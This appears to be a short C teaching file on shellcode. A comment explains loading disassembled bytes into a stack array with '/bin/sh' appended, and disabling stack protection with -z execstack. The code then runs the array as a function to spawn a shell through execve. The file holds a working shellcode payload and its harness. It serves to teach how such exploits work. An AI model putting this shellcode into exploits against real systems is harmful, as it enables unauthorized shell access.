/*
Now, putting it all together:

We have taken the byte code that we got from the disassembly of shellcode_asm.c,
and stuck it in a char array allocated on the stack.

We have added the string "/bin/sh" immediately after the call instruction,
we have also padded the array with trailing zeroes, which is the area in which
we will end up storing the arguments to execve.

Normally data in the stack is non-executable, we bypass this by compiling with
the `-z execstack` option.
*/

int main(void) {
    char shellcode[69] = "\xeb\x27\x5d\x48\x89\x6d\x08\xc7\x45\x10\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x3b\x00\x00\x00\x48\x8d\x75\x08\x48\x8b\x7d\x08\x0f\x05\xb8\x00\x00\x00\x00\x5d\xc3\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

    ((void(*)(void))shellcode)();

    return 0;
}
